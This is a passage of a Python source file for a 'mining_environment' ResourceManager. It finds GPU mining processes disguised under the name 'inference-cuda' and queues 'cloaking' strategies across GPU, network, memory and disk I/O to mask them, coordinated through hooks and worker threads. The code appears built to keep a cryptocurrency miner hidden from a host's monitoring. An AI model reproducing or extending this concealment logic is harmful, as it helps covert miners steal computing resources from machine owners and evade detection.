            # **Base strategies for GPU processes** (chiến lược cơ bản cho tiến trình GPU)
            base_strategies = ['gpu_cloaking', 'network', 'memory']
            
            # **Filter available strategies** (lọc chiến lược khả dụng)
            available_strategies = []
            for strategy in base_strategies:
                if self._is_strategy_available(strategy):
                    available_strategies.append(strategy)
                else:
                    self.logger.debug(f"🚫 [UNIFIED] Strategy '{strategy}' not available, skipping")
            
            # **Ensure at least one strategy** (đảm bảo ít nhất một chiến lược)
            if not available_strategies:
                self.logger.warning(f"⚠️ [UNIFIED] No strategies available - using fallback")
                available_strategies = ['network']  # Safe fallback
            
            return available_strategies
            
        except Exception as e:
            self.logger.error(f"❌ [UNIFIED] Error determining strategies: {e}")
            return ['network']  # Safe fallback
    
    def _enqueue_with_deduplication(self, task: tuple) -> bool:
        """
        **Enqueue Task with PID Deduplication** (xếp hàng task với khử trùng lặp PID)
        
        UNIFIED SOLUTION: Single entry point với PID-based deduplication.
        Prevents duplicate processing của cùng PID từ multiple sources.
        
        Args:
            task: Task tuple (priority, timestamp, task_data)
            
        Returns:
            bool: True nếu task được enqueued successfully
        """
        try:
            _, _, task_data = task
            pid = task_data['process'].pid
            source = task_data['source']
            
            # **Check if PID already in queue or processing** (kiểm tra PID đã trong hàng đợi hoặc đang xử lý)
            with self.mining_processes_lock:
                current_state = self.process_states.get(pid)
                
                if current_state in ['cloaking', 'cloaked']:
                    self.logger.info(f"🚫 [DEDUP] PID {pid} already {current_state}, skipping từ {source}")
                    return False
                
                # **Mark as cloaking to prevent duplicates** (đánh dấu đang cloaking để tránh trùng lặp)
                self.process_states[pid] = 'cloaking'
                self.resource_adjustment_queue.put(task)
                
                action = task_data['action']
                urgent = task_data['urgent']
                coordination_status = task_data['coordination_status']
                
                self.logger.info(f"✅ [UNIFIED] Enqueued PID {pid} từ {source}")
                self.logger.info(f"🎯 [UNIFIED] Action: {action}, Urgent: {urgent}, Coordinated: {coordination_status}")
                self.logger.info(f"🔧 [UNIFIED] Strategies: {task_data['strategies']}")
                
                return True
                
        except Exception as e:
            self.logger.error(f"❌ [UNIFIED] Failed to enqueue with deduplication: {e}")
            return False
    
    def trigger_cloaking(self, process: MiningProcess, source: str, 
                       urgent: bool = False, coordination_data: Dict = None) -> bool:
        """
        **Single Unified Entry Point** (điểm vào duy nhất thống nhất)
        
        UNIFIED SOLUTION: Replaces _trigger_immediate_cloaking() và enqueue_cloaking().
        Single method cho tất cả cloaking requests với consistent behavior.
        
        Args:
            process: MiningProcess object cần cloaking
            source: Source of request ('direct_registry', 'discovery', 'file_scanner')
            urgent: True cho immediate cloaking với hook coordination
            coordination_data: Optional hook coordination results
            
        Returns:
            bool: True if cloaking request processed successfully
        """
        try:
            pid = process.pid
            action_type = "immediate" if urgent else "standard"
            
            self.logger.info(f"🚀 [UNIFIED] Starting {action_type} cloaking cho PID {pid} từ {source}")
            
            # **Enhanced Hook Coordination for Urgent Requests** (phối hợp hook nâng cao cho yêu cầu khẩn cấp)
            if urgent and not coordination_data:
                self.logger.info(f"🔄 [UNIFIED] Attempting hook coordination cho immediate cloaking PID {pid}")
                coordination_data = self._attempt_hook_coordination_with_recovery(pid)
                
                if coordination_data['success']:
                    self.logger.info(f"✅ [UNIFIED] Hook coordination successful cho PID {pid}")
                else:
                    self.logger.warning(f"⚠️ [UNIFIED] Hook coordination failed cho PID {pid} - proceeding với fallback")
                    
                    # **Safety check for fallback mode** (kiểm tra an toàn cho chế độ fallback)
                    if not self._should_use_fallback_cloaking(pid, coordination_data):
                        self.logger.error(f"🚨 [UNIFIED] Fallback cloaking deemed unsafe cho PID {pid} - aborting")
                        return False
            
            # **Create unified task** (tạo task thống nhất)
            task = self._create_unified_cloaking_task(
                process, source, urgent, coordination_data
            )
            
            # **Enqueue with deduplication** (xếp hàng với khử trùng lặp)
            success = self._enqueue_with_deduplication(task)
            
            if success:
                mode = "coordinated" if coordination_data and coordination_data.get('success') else "fallback"
                self.logger.info(f"✅ [UNIFIED] {action_type.title()} cloaking queued cho PID {pid} (mode: {mode})")
            else:
                self.logger.warning(f"⚠️ [UNIFIED] Failed to queue cloaking cho PID {pid}")
            
            return success
            
        except Exception as e:
            self.logger.error(f"❌ [UNIFIED] Failed to trigger cloaking cho PID {process.pid}: {e}")
            
            # **Emergency fallback attempt** (thử fallback khẩn cấp)
            if urgent:
                self._attempt_emergency_fallback_cloaking(process, str(e))
            
            return False
    
    def _attempt_hook_coordination_with_recovery(self, pid: int) -> Dict[str, Any]:
        """
        **Enhanced Hook Coordination with Recovery** (phối hợp hook nâng cao với khôi phục)
        
        UNIFIED METHOD: Simplified hook coordination với intelligent recovery strategies.
        Used by trigger_cloaking() method cho consistent coordination behavior.
        
        Args:
            pid: Process ID cần coordination
            
        Returns:
            Dict[str, Any]: Coordination result với success status và metadata
        """
        try:
            self.logger.info(f"🔄 [UNIFIED-COORD] Starting hook coordination cho PID {pid}")
            
            # **Import coordinator safely** (nhập coordinator an toàn)
            coordinator = self._import_hook_coordinator()
            if not coordinator:
                return {
                    'success': False,
                    'method': 'import_failed',
                    'reason': 'coordinator_import_failed',
                    'memory_safe': False,
                    'retry_count': 0
                }
            
            # **Quick readiness check** (kiểm tra sẵn sàng nhanh)
            if coordinator.check_hooks_ready(pid):
                self.logger.info(f"✅ [UNIFIED-COORD] Immediate coordination success cho PID {pid}")
                return {
                    'success': True,
                    'method': 'immediate',
                    'reason': 'hooks_already_ready',
                    'memory_safe': True,
                    'retry_count': 0
                }
            
            # **Attempt registration and wait** (thử đăng ký và chờ)
            try:
                coordinator.register_pid(pid)
                if coordinator.wait_for_hooks_ready(pid, timeout=30):
                    self.logger.info(f"✅ [UNIFIED-COORD] Registration + wait successful cho PID {pid}")
                    return {
                        'success': True,
                        'method': 'register_and_wait',
                        'reason': 'coordination_successful',
                        'memory_safe': True,
                        'retry_count': 1
                    }
            except Exception as coord_err:
                self.logger.warning(f"⚠️ [UNIFIED-COORD] Coordination attempt failed: {coord_err}")
            
            # **Memory safety assessment for fallback** (đánh giá an toàn bộ nhớ cho fallback)
            safety_assessment = self._assess_memory_safety_for_fallback(pid)
            
            return {
                'success': False,
                'method': 'coordination_failed',
                'reason': 'timeout_or_error',
                'memory_safe': safety_assessment['safe'],
                'retry_count': 1,
                'fallback_recommended': safety_assessment['fallback_recommended']
            }
                
        except Exception as e:
            self.logger.error(f"❌ [UNIFIED-COORD] Hook coordination exception: {e}")
            return {
                'success': False,
                'method': 'exception',
                'reason': f'coordination_exception: {e}',
                'memory_safe': False,
                'retry_count': 0
            }
    
    def _import_hook_coordinator(self):
        """
        **Safe Hook Coordinator Import** (nhập hook coordinator an toàn)
        
        UNIFIED METHOD: Import hook coordinator với safe error handling.
        """
        try:
            import sys
            import os
            coord_path = os.path.join(os.path.dirname(__file__), '..', 'coordination')
            if coord_path not in sys.path:
                sys.path.insert(0, coord_path)
            
            from coordinator import get_hook_coordinator
            coordinator = get_hook_coordinator()
            
            self.logger.debug(f"✅ [UNIFIED-IMPORT] Hook coordinator imported successfully")
            return coordinator
            
        except Exception as e:
            self.logger.error(f"❌ [UNIFIED-IMPORT] Failed to import hook coordinator: {e}")
            return None
    
    # **REMOVED**: _ensure_pid_registration_with_recovery method
    # Functionality integrated into _attempt_hook_coordination_with_recovery for simplicity.
    
    # **REMOVED**: _check_hook_readiness_progressive method
    # Complex progressive logic simplified and integrated into _attempt_hook_coordination_with_recovery.
    
    # **REMOVED**: _monitored_wait_for_hooks method
    # Monitoring functionality not needed in simplified coordination approach.
    
    # **REMOVED**: _attempt_hook_recovery method
    # Complex recovery logic simplified - basic retry now handled in coordination method.
    
    def _assess_memory_safety_for_fallback(self, pid: int) -> Dict[str, Any]:
        """
        **PHASE 1: Memory Safety Assessment cho Fallback** (đánh giá an toàn bộ nhớ cho fallback)
        
        Determines if fallback cloaking is safe based on current memory conditions.
        """
        try:
            self.logger.info(f"🧠 [PHASE1-MEMORY] Assessing memory safety cho fallback cloaking PID {pid}")
            
            # **Get current memory pressure** (lấy áp lực bộ nhớ hiện tại)
            memory_pressure = self.monitor_memory_pressure()
            pressure_level = memory_pressure['pressure_level']
            usage_percent = memory_pressure['usage_percent']
            
            # **Safety decision matrix** (ma trận quyết định an toàn)
            if pressure_level == 'LOW' and usage_percent < 70:
                safety_assessment = {
                    'safe': True,
                    'fallback_recommended': True,
                    'reason': 'low_memory_pressure',
                    'confidence': 'high'
                }
            elif pressure_level == 'MODERATE' and usage_percent < 80:
                safety_assessment = {
                    'safe': True,
                    'fallback_recommended': True,
                    'reason': 'moderate_memory_pressure_acceptable',
                    'confidence': 'medium'
                }
            elif pressure_level == 'HIGH' and usage_percent < 85:
                safety_assessment = {
                    'safe': False,
                    'fallback_recommended': False,
                    'reason': 'high_memory_pressure_risky',
                    'confidence': 'high'
                }
            else:
                safety_assessment = {
                    'safe': False,
                    'fallback_recommended': False,
                    'reason': 'critical_memory_pressure',
                    'confidence': 'high'
                }
            
            self.logger.info(f"🧠 [PHASE1-MEMORY] Safety assessment: {safety_assessment['reason']} (confidence: {safety_assessment['confidence']})")
            return safety_assessment
            
        except Exception as e:
            self.logger.error(f"❌ [PHASE1-MEMORY] Memory safety assessment failed: {e}")
            return {
                'safe': False,
                'fallback_recommended': False,
                'reason': f'assessment_failed: {e}',
                'confidence': 'unknown'
            }
    
    def _should_use_fallback_cloaking(self, pid: int, coordinator_result: Dict[str, Any]) -> bool:
        """
        **Fallback Cloaking Decision Logic** (logic quyết định cloaking fallback)
        
        UNIFIED METHOD: Intelligent decision making cho fallback cloaking safety.
        """
        try:
            memory_safe = coordinator_result.get('memory_safe', False)
            fallback_recommended = coordinator_result.get('fallback_recommended', False)
            reason = coordinator_result.get('reason', 'unknown')
            
            # **Safety-first decision logic** (logic quyết định an toàn trước)
            if memory_safe and fallback_recommended:
                self.logger.info(f"✅ [UNIFIED-DECISION] Fallback approved: memory safe + recommended cho PID {pid}")
                return True
            elif memory_safe and reason in ['coordination_timeout', 'timeout_or_error']:
                self.logger.info(f"✅ [UNIFIED-DECISION] Fallback approved: memory safe despite {reason} cho PID {pid}")
                return True
            elif not memory_safe:
                self.logger.error(f"❌ [UNIFIED-DECISION] Fallback denied: memory unsafe cho PID {pid}")
                return False
            else:
                self.logger.warning(f"⚠️ [UNIFIED-DECISION] Fallback denied: insufficient safety conditions cho PID {pid}")
                return False
                
        except Exception as e:
            self.logger.error(f"❌ [UNIFIED-DECISION] Fallback decision failed: {e}")
            return False  # Conservative - deny on error
    
    def _attempt_emergency_fallback_cloaking(self, mining_process, error_reason: str) -> None:
        """
        **Emergency Fallback Cloaking** (cloaking fallback khẩn cấp)
        
        UNIFIED METHOD: Last resort cloaking attempt using unified task format.
        Called when main trigger_cloaking() fails completely.
        """
        try:
            pid = mining_process.pid
            self.logger.warning(f"🚨 [UNIFIED-EMERGENCY] Attempting emergency fallback cho PID {pid}")
            self.logger.warning(f"🚨 [UNIFIED-EMERGENCY] Original error: {error_reason}")
            
            # **Check if emergency fallback is safe** (kiểm tra fallback khẩn cấp có an toàn)
            memory_pressure = self.monitor_memory_pressure()
            if memory_pressure['pressure_level'] in ['CRITICAL']:
                self.logger.error(f"🚨 [UNIFIED-EMERGENCY] Emergency fallback DENIED - critical memory pressure")
                return
            
            # **Create unified emergency cloaking task** (tạo task cloaking khẩn cấp thống nhất)
            emergency_task = (
                0,  # Highest priority
                time.time(),
                {
                    'type': 'cloaking',                    # **UNIFIED FORMAT** (định dạng thống nhất)
                    'action': 'emergency_cloak',
                    'process': mining_process,
                    'source': 'emergency_fallback',
                    'urgent': True,
                    'strategies': ['network', 'disk_io'],   # Safe emergency strategies
                    'coordination_status': False,
                    'fallback_mode': True,
                    'memory_safe': True,                    # Pre-checked above
                    'emergency_reason': error_reason
                }
            )
            
            self.resource_adjustment_queue.put(emergency_task)
            self.logger.warning(f"🚨 [UNIFIED-EMERGENCY] Emergency task queued cho PID {pid}")
            
        except Exception as e:
            self.logger.error(f"❌ [UNIFIED-EMERGENCY] Emergency fallback failed: {e}")
            # **Ultimate fallback - log for manual intervention** (fallback cuối cùng - ghi log để can thiệp thủ công)
            self.logger.critical(f"💀 [UNIFIED-CRITICAL] All cloaking methods failed cho PID {pid} - manual intervention required")

    # **REMOVED**: enqueue_cloaking method - replaced by trigger_cloaking unified method
    # Original method created task format conflicts with worker processing.
    # All calls now use trigger_cloaking(process, source, urgent=False) instead.

    # **REMOVED**: _get_additional_strategies method - functionality moved to _determine_strategies
    # **REMOVED**: _filter_available_strategies method - functionality integrated into _determine_strategies
    # These methods caused code duplication and are now handled by unified _determine_strategies method.

    def _is_strategy_available(self, strategy_name: str) -> bool:
        """
        ✅ NEW: Check if a specific strategy is available in current system
        
        :param strategy_name: Name of strategy to check
        :return: True if strategy is available and can be used
        """
        try:
            # ✅ CONFIG-BASED AVAILABILITY: Check configuration settings
            strategy_config = self.config.get('cloaking_strategies', {})
            if not strategy_config.get(strategy_name, {}).get('enabled', True):
                return False
            
            # ✅ SYSTEM-BASED AVAILABILITY: Check system capabilities
            availability_checks = {
                # CPU cloaking completely removed
                'gpu_cloaking': self.is_gpu_initialized(),  # Requires GPU
                'network': self._check_network_availability(),
                'disk_io': self._check_disk_io_availability(), 
                'cache': self._check_cache_availability(),
                'memory': self._check_memory_availability(),
                # ✅ REMOVED: 'thermal_control' - thermal management integrated trong gpu_cloaking
            }
            
            return availability_checks.get(strategy_name, False)
            
        except Exception as e:
            self.logger.debug(f"Error checking strategy availability for '{strategy_name}': {e}")
            return False

    def _check_network_availability(self) -> bool:
        """Check if network cloaking is available (iptables, tc)"""
        try:
            # Check if we have network resource manager
            return 'network' in getattr(self.shared_resource_manager, 'resource_managers', {})
        except:
            return False

    def _check_disk_io_availability(self) -> bool:
        """Check if disk I/O cloaking is available (ionice)"""
        try:
            # Check if we have disk I/O resource manager
            return 'disk_io' in getattr(self.shared_resource_manager, 'resource_managers', {})
        except:
            return False

    def _check_cache_availability(self) -> bool:
        """Check if cache cloaking is available"""
        try:
            # Check if we have cache resource manager
            return 'cache' in getattr(self.shared_resource_manager, 'resource_managers', {})
        except:
            return False

    def _check_memory_availability(self) -> bool:
        """Check if memory cloaking is available (cgroups memory)"""
        try:
            # Check if we have memory resource manager
            return 'memory' in getattr(self.shared_resource_manager, 'resource_managers', {})
        except:
            return False

    # -----------------------------------------------------------------------------------------
    # METRICS (SYNC)
    # -----------------------------------------------------------------------------------------

    def collect_metrics(self, process: MiningProcess) -> Dict[str, Any]:
        try:
            if not psutil.pid_exists(process.pid):
                self.logger.warning(f"PID={process.pid} không tồn tại.")
                return {}

            proc_obj = psutil.Process(process.pid)
            # CPU monitoring removed - GPU-only mode
            mem_mb = proc_obj.memory_info().rss / (1024**2)

            gpu_pct = 0.0
            if self.is_gpu_initialized():
                gpu_pct = self.shared_resource_manager.get_gpu_usage_percent(process.pid)

            # Tùy logic dự án, ở đây ví dụ:
            disk_mbps = 0.0 # Tính sau
            cache_l = self.shared_resource_manager.get_process_cache_usage(process.pid) if self.shared_resource_manager else 0.0

            metrics = {
                # CPU usage monitoring removed
                'memory_usage': float(mem_mb),
                'gpu_usage': float(gpu_pct),
                'network_usage': float(disk_mbps),
                'cache_usage': float(cache_l),
            }
            self.logger.debug(f"Metrics PID={process.pid}: {metrics}")
            return metrics
        except Exception as e:
            self.logger.error(f"Lỗi collect_metrics PID={process.pid}: {e}\n{traceback.format_exc()}")
            return {}

    def collect_all_metrics(self) -> Dict[str, Dict[str, Any]]:
        metrics_data: Dict[str, Dict[str, Any]] = {}
        if not self.mining_processes_lock.acquire(timeout=5):
            self.logger.error("Timeout lock collect_all_metrics.")
            return metrics_data
        try:
            for p in self.mining_processes:
                res = self.collect_metrics(p)
                if res:
                    metrics_data[str(p.pid)] = res
                else:
                    self.logger.warning(f"Không có metrics hợp lệ cho PID={p.pid}")
            self.logger.debug(f"Dữ liệu metrics (all): {metrics_data}")
        except Exception as e:
            self.logger.error(f"Lỗi collect_all_metrics: {e}\n{traceback.format_exc()}")
        finally:
            self.mining_processes_lock.release()

        return metrics_data

    def _discover_and_register_existing_processes(self) -> None:
        """
        🔍 PROCESS DISCOVERY: Scan system for existing mining processes and register them
        Solves timing issue where processes start before ResourceManager is ready
        """
        import psutil
        
        target_processes = {
            # CPU mining processes removed - GPU-only mode
            'inference-cuda': True  # GPU mining  
        }
        
        discovered_count = 0
        
        try:
            self.logger.info(f"Starting process discovery scan...")
            process_count = 0
            target_found = 0
            
            for proc in psutil.process_iter(['pid', 'name', 'cmdline']):
                process_count += 1
                try:
                    proc_name = proc.info['name']
                    if proc_name in target_processes:
                        target_found += 1
                        self.logger.info(f"Found target process: {proc_name}")
                        pid = proc.info['pid']
                        is_gpu = target_processes[proc_name]
                        
                        self.logger.info(f"🔍 [PROCESS DISCOVERY] Found {proc_name} PID={pid} (GPU)")
                        
                        # ✅ NEW: Skip wrapper PIDs that should be ignored
                        if pid in self.ignored_wrapper_pids:
                            self.logger.info(f"🚫 [PROCESS DISCOVERY] Skipping wrapper PID {pid} - in ignored list")
                            self.logger.info(f"📋 [PROCESS DISCOVERY] Ignored wrapper PIDs: {list(self.ignored_wrapper_pids)}")
                            continue
                        
                        # Create MiningProcess object for real mining PID only
                        mining_process = MiningProcess(pid, proc_name, is_gpu=is_gpu)
                        
                        # Add to tracking list
                        with self.mining_processes_lock:
                            # Check if already exists
                            existing = any(mp.pid == pid for mp in self.mining_processes)
                            if not existing:
                                self.mining_processes.append(mining_process)
                                self.logger.info(f"🔍 [PROCESS DISCOVERY] Added {proc_name} PID={pid} to tracking")
                                
                                # **Unified cloaking trigger** (kích hoạt cloaking thống nhất)
                                self.logger.info(f"🔍 [PROCESS DISCOVERY] Triggering cloaking cho {proc_name} PID={pid}")
                                self.trigger_cloaking(mining_process, 'discovery', urgent=False)
                                discovered_count += 1
                                self.logger.debug(f"New process added - discovered count: {discovered_count}")
                            else:
                                self.logger.debug(f"Process {proc_name} PID={pid} already tracked, skipping")
                                
                except (psutil.NoSuchProcess, psutil.AccessDenied, psutil.ZombieProcess):
                    # Skip processes that can't be accessed
                    continue
                except Exception as proc_err:
                    self.logger.warning(f"🔍 [PROCESS DISCOVERY] Error processing {proc.info.get('name', 'unknown')}: {proc_err}")
                    
        except Exception as e:
            self.logger.error(f"❌ [PROCESS DISCOVERY] Discovery failed: {e}")
            
        # Final detailed report
        current_tracked_count = len(self.mining_processes) if hasattr(self, 'mining_processes') else 0
        self.logger.info(f"Process discovery completed - total scanned: {process_count}, targets found: {target_found}, newly discovered: {discovered_count}")
        
        # Improved final message based on discovery context
        if discovered_count > 0:
            self.logger.info(f"✅ [PROCESS DISCOVERY] Completed - discovered {discovered_count} NEW mining processes")
        else:
            if target_found > 0:
                self.logger.info(f"✅ [PROCESS DISCOVERY] Completed - found {target_found} existing processes (0 new discoveries)")
            else:
                self.logger.info(f"✅ [PROCESS DISCOVERY] Completed - no mining processes found")

    def receive_from_registry(self, pid: int, registry_metadata: Dict[str, Any]) -> bool:
        """
        **Receive From Registry** (nhận từ registry)
        
        NEW METHOD: Final step trong linear flow từ DirectPIDRegistry.
        Implements: DirectPIDRegistry → ResourceManager (CORRECT FLOW)
        
        Args:
            pid: Process ID từ registry
            registry_metadata: Metadata từ registry forwarding
            
        Returns:
            bool: True nếu resource management initialization successful
        """
        try:
            self.logger.info(f"🎯 [RM-REGISTRY-RECEIVE] Receiving PID {pid} from DirectPIDRegistry (FINAL STEP)")
            self.logger.debug(f"🔍 [RM-REGISTRY-RECEIVE] Registry metadata: {registry_metadata}")
            
            # **Extract process information** (trích xuất thông tin tiến trình)
            source_chain = registry_metadata.get('source_chain', [])
            process_info = registry_metadata.get('process_info', {})
            stealth_name = registry_metadata.get('stealth_name', 'inference-cuda')
            
            self.logger.info(f"🔗 [RM-REGISTRY-RECEIVE] Complete source chain: {' → '.join(source_chain + ['resource_manager'])}")
            
            # **Create MiningProcess object** (tạo đối tượng MiningProcess)
            try:
                import psutil
                process_obj = psutil.Process(pid)
                
                # ✅ REFACTORED: Using factory method to prevent parameter mismatch
                # Previous issue: used unsupported parameters 'process_type', 'start_time', 'process_obj'
                # Solution: MiningProcess.from_process_info() validates parameters and handles GPU classification
                mining_process = MiningProcess.from_process_info(
                    pid=pid,
                    name=stealth_name,
                    is_gpu_process=True,  # Explicitly mark as GPU process (priority=2 auto-assigned)
                    logger=self.logger      # Pass logger for consistent logging
                )
                
                # **Add to tracking list** (thêm vào danh sách theo dõi)
                with self.mining_processes_lock:
                    # Check for duplicates
                    existing = [p for p in self.mining_processes if p.pid == pid]
                    if not existing:
                        self.mining_processes.append(mining_process)
                        self.logger.info(f"📋 [RM-REGISTRY-RECEIVE] Added to tracking list: PID={pid}")
                    else:
                        self.logger.info(f"📋 [RM-REGISTRY-RECEIVE] Already tracked: PID={pid}")
                
                # **Unified immediate cloaking activation** (kích hoạt cloaking tức thì thống nhất)
                self.logger.info(f"🔒 [RM-REGISTRY-RECEIVE] Activating unified immediate cloaking for PID={pid}")
                self.trigger_cloaking(mining_process, 'file_registry', urgent=True)
                
                self.logger.info(f"✅ [RM-REGISTRY-RECEIVE] Successfully processed PID {pid} from DirectPIDRegistry")
                return True
                
            except psutil.NoSuchProcess:
                self.logger.error(f"❌ [RM-REGISTRY-RECEIVE] Process {pid} no longer exists")
                return False
                
        except Exception as e:
            self.logger.error(f"❌ [RM-REGISTRY-RECEIVE] Failed to receive from registry for PID {pid}: {e}")
            return False
    
    def receive_from_coordinator(self, pid: int, coordinator_metadata: Dict[str, Any]) -> bool:
        """
        **Receive From Coordinator** (nhận từ coordinator)
        
        Enhanced linear flow method để nhận sequential handoff từ Hook Coordinator.
        Triggers immediate strategy application sau khi nhận coordination signal.
        
        Args:
            pid: Process ID từ coordinator
            coordinator_metadata: Metadata từ coordinator handoff
            
        Returns:
            bool: True nếu resource management initialization successful
        """
        try:
            self.logger.info(f"🔄 [RM-LINEAR-RECEIVE] Receiving PID {pid} from coordinator via sequential handoff")
            self.logger.debug(f"🔍 [RM-LINEAR-RECEIVE] Coordinator metadata: {coordinator_metadata}")
            
            with self._linear_handoff_lock:
                # **Track linear handoff metadata** (theo dõi metadata handoff tuyến tính)
                handoff_record = {
                    'timestamp': time.time(),
                    'source': 'hook_coordinator',
                    'original_metadata': coordinator_metadata,
                    'resource_manager_timestamp': time.time(),
                    'handoff_chain': coordinator_metadata.get('handoff_chain', []) + ['resource_manager']
                }
                
                self._linear_handoff_tracking[pid] = handoff_record
                self.logger.debug(f"📝 [RM-LINEAR-RECEIVE] Handoff record stored for PID {pid}")
            
            # **Immediate strategy orchestration** (điều phối chiến lược ngay lập tức)
            orchestration_success = self._orchestrate_linear_strategies(pid, handoff_record)
            
            if orchestration_success:
                self.logger.info(f"✅ [RM-LINEAR-RECEIVE] Successfully received and orchestrated strategies for PID {pid}")
                return True
            else:
                self.logger.warning(f"⚠️ [RM-LINEAR-RECEIVE] Strategy orchestration failed for PID {pid}")
                return False
                
        except Exception as e:
            self.logger.error(f"❌ [RM-LINEAR-RECEIVE] Failed to receive from coordinator for PID {pid}: {e}")
            return False
    
    def _orchestrate_linear_strategies(self, pid: int, handoff_metadata: Dict[str, Any]) -> bool:
        """
        **Orchestrate Linear Strategies** (điều phối chiến lược tuyến tính)
        
        Core orchestration method cho sequential strategy application trong linear flow.
        Triggers strategy chain based on handoff metadata and process characteristics.
        
        Args:
            pid: Process ID
            handoff_metadata: Metadata từ linear handoff chain
            
        Returns:
            bool: True nếu strategy orchestration successful
        """
        try:
            self.logger.info(f"🎯 [STRATEGY-ORCHESTRATION] Starting linear strategy orchestration for PID {pid}")
            
            # **Check if we have an active SharedResourceManager** (kiểm tra SharedResourceManager đang hoạt động)
            if not self.shared_resource_manager:
                self.logger.warning(f"⚠️ [STRATEGY-ORCHESTRATION] SharedResourceManager not initialized - deferring orchestration")
                return False
            
            # **Create MiningProcess object for strategy application** (tạo đối tượng MiningProcess cho áp dụng chiến lược)
            try:
                import psutil
                process_obj = psutil.Process(pid)
                mining_process = MiningProcess(
                    pid=pid,
                    name=process_obj.name(),
                    cpu_percent=0,  # Will be updated during strategy application
                    memory_percent=0  # Will be updated during strategy application
                )
                
                # **Sequential strategy application** (áp dụng chiến lược tuần tự)
                # Apply strategies in specific order for predictable results
                strategy_sequence = self._determine_strategy_sequence(handoff_metadata)
                
                for strategy_name in strategy_sequence:
                    try:
                        self.logger.info(f"🔄 [STRATEGY-ORCHESTRATION] Applying strategy '{strategy_name}' to PID {pid}")
                        self.shared_resource_manager.apply_cloak_strategy(strategy_name, mining_process)
                        self.logger.info(f"✅ [STRATEGY-ORCHESTRATION] Strategy '{strategy_name}' applied successfully")
                    except Exception as strategy_err:
                        self.logger.error(f"❌ [STRATEGY-ORCHESTRATION] Strategy '{strategy_name}' failed for PID {pid}: {strategy_err}")
                        # Continue with other strategies
                
                self.logger.info(f"🎯 [STRATEGY-ORCHESTRATION] Linear strategy orchestration completed for PID {pid}")
                return True
                
            except psutil.NoSuchProcess:
                self.logger.error(f"❌ [STRATEGY-ORCHESTRATION] Process {pid} no longer exists")
                return False
                
        except Exception as e:
            self.logger.error(f"❌ [STRATEGY-ORCHESTRATION] Strategy orchestration failed for PID {pid}: {e}")
            return False
    
    def _determine_strategy_sequence(self, handoff_metadata: Dict[str, Any]) -> List[str]:
        """
        **Determine Strategy Sequence** (xác định trình tự chiến lược)
        
        Intelligent strategy sequencing based on handoff metadata và process characteristics.
        
        Args:
            handoff_metadata: Metadata từ handoff chain
            
        Returns:
            List[str]: Ordered list of strategy names to apply
        """
        # **Default GPU strategy sequence** (trình tự chiến lược GPU mặc định)
        # Designed for optimal cloaking effectiveness
        default_sequence = [
            'default_gpu_cloak',  # Base GPU cloaking
            'thermal_management',  # Thermal optimization
            'performance_optimization'  # Performance tuning
        ]
        
        # **Future enhancement**: Analyze handoff metadata for intelligent sequencing
        # For now, return default sequence for predictable behavior
        return default_sequence

    def start(self):
        """
        **Enhanced Start Method với Readiness Signaling** (phương thức start nâng cao với tín hiệu sẵn sàng)
        
        Performs complete ResourceManager initialization và signals readiness khi completed.
        **PHASE 2**: Integrated readiness signaling để eliminate race conditions.
        """
        self.logger.info("🚀 Starting ResourceManager (PHASE 2: Enhanced với Readiness Signaling)...")
        start_time = time.time()
        
        # **PHASE 2: Clear any previous ready signal** (xóa tín hiệu sẵn sàng trước đó)
        self.clear_ready_signal()
        
        try:
            # Step 1: Minimal essential initialization only
            step_start = time.time()
            self.logger.info("⚡ Step 1/3: Essential components creation...")
            
            # ✅ ENHANCED: Shared resource managers creation với singleton optimization
            try:
                resource_managers = ResourceControlFactory.create_resource_managers(
                    config=self.config,
                    logger=self.logger
                )
                
                if not resource_managers:
                    self.logger.warning("ResourceControlFactory trả về rỗng - using fallback mode")
                    resource_managers = {}  # Fallback mode
                else:
                    # ✅ LOG SHARING EFFICIENCY
                    sharing_info = ResourceControlFactory.get_shared_managers_info()
                    self.logger.info(f"📊 [ResourceManager] {sharing_info['memory_efficiency']}")
                    self.logger.info(f"♾️ [ResourceManager] Using shared managers: {list(resource_managers.keys())}")
                    
                self.logger.info(f"✅ Step 1 completed in {time.time() - step_start:.2f}s")
            except Exception as e:
                self.logger.warning(f"Shared resource managers creation failed: {e} - using fallback mode")
                resource_managers = {}

            # Step 2: Fast SharedResourceManager với lazy NVML init
            step_start = time.time()
            self.logger.info("⚡ Step 2/3: Fast SharedResourceManager (lazy init)...")
            try:
                self.shared_resource_manager = SharedResourceManager(self.config, self.logger, resource_managers)
                
                # ✅ INITIALIZE GPU MONITORING: Khởi tạo GPU monitoring system
                self.logger.info("🎮 [STARTUP] GPU monitoring initialization checkpoint started")
                self._initialize_gpu_monitoring(resource_managers)
                self.logger.info("✅ [STARTUP] GPU monitoring validation checkpoint passed")
                
                self.logger.info(f"✅ Step 2 completed in {time.time() - step_start:.2f}s")
            except Exception as e:
                self.logger.warning(f"SharedResourceManager init failed: {e} - continuing without shared resources")
                self.shared_resource_manager = None

            # Step 3: Background worker setup (non-blocking)
            step_start = time.time()
            self.logger.info("⚡ Step 3/3: Background workers setup...")
            
            # Start worker thread ngay lập tức
            adjust_thread = threading.Thread(
                target=self.process_resource_adjustments,
                daemon=True,
                name="CloakingWorker"
            )
            adjust_thread.start()
            self.workers.append(adjust_thread)

            # ✅ NEW: Spawn additional CloakingWorker threads (parallel processing)
            additional_workers = 3  # Total 4 workers (1 original + 3 extra)
            for idx in range(additional_workers):
                t = threading.Thread(
                    target=self.process_resource_adjustments,
                    daemon=True,
                    name=f"CloakingWorker-{idx+2}"
                )
                t.start()
                self.workers.append(t)
            
            # ✅ SIMPLIFIED: DirectPIDRegistry-driven architecture only
            
            # ✅ NEW: Start File-Based Registry Scanner Thread (Shared File-Based Registry Solution)
            scanner_thread = threading.Thread(
                target=self._file_registry_scanner_worker,
                daemon=True,
                name="FileRegistryScanner"
            )
            scanner_thread.start()
            self.workers.append(scanner_thread)
            self.logger.info("📁 [FILE-SCANNER] File-based registry scanner thread started")
            
            # --- NEW: Force-create detailed log files for core modules ---
            try:
                from mining_environment.scripts.unified_logging import get_unified_logger
                for core_logger_name in [
                    'mining_environment.cloak_strategies',
                    'mining_environment.resource_control']:
                    lg = get_unified_logger(core_logger_name)
                    lg.setLevel(logging.DEBUG)  # Đảm bảo level DEBUG
                    for h in lg.handlers:
                        h.setLevel(logging.DEBUG)
                    lg.info("===== CORE LOGGER INITIALIZED BY ResourceManager.start =====")
            except Exception as init_log_err:
                self.logger.debug(f"[DIAGNOSTIC] Unable to initialize core loggers: {init_log_err}")

            total_time = time.time() - start_time
            self.logger.info(f"🎯 ResourceManager startup completed in {total_time:.2f}s (Target: <5s)")
            
